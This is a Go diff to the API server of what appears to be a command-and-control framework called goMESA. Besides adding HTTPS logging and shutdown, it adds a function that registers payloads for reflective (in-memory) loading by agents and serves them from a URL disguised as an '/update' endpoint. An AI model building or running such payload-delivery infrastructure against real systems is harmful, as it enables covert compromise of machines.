@@ -1,7 +1,10 @@
 package api
 
 import (
+	"crypto/rand"
+	"encoding/hex"
 	"encoding/json"
+	"fmt"
 	"goMESA/internal/server/https_server"
 	"log"
 	"net/http"
@@ -89,7 +92,7 @@ func (s *APIServer) Start() error {
 		log.Printf("Warning: Failed to start HTTPS server: %v", err)
 		// Continue anyway, as this is not critical
 	}
-	log.Println("Starting HTTPS server.")
+	log.Printf("Starting HTTPS server on %s.\n", s.httpsServer.GetListenAddr())
 
 	log.Printf("API Server starting on %s", s.httpServer.Addr)
 	return s.httpServer.ListenAndServe()
@@ -97,6 +100,9 @@ func (s *APIServer) Start() error {
 
 // Stop stops the API server
 func (s *APIServer) Stop() error {
+	if err := s.httpsServer.Stop(); err != nil {
+		log.Printf("Warning: Error stopping HTTPS server: %v", err)
+	}
 	return s.httpServer.Close()
 }
 
@@ -263,4 +269,22 @@ func (s *APIServer) handleGroupAgent(w http.ResponseWriter, r *http.Request) {
 
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(response)
+}
+
+// RegisterReflectivePayload registers a payload for reflective loading
+func (s *APIServer) RegisterReflectivePayload(payloadData []byte, functionName string) (string, string, error) {
+	// Generate a random payload ID
+	idBytes := make([]byte, 16)
+	if _, err := rand.Read(idBytes); err != nil {
+		return "", "", fmt.Errorf("failed to generate payload ID: %v", err)
+	}
+	payloadID := hex.EncodeToString(idBytes)
+
+	// Register the payload with the HTTPS server
+	s.httpsServer.RegisterPayload(payloadID, payloadData, functionName)
+
+	// Construct the complete URL
+	serverURL := fmt.Sprintf("https://%s/update?id=%s", s.httpsServer.GetListenAddr(), payloadID)
+
+	return payloadID, serverURL, nil
 }
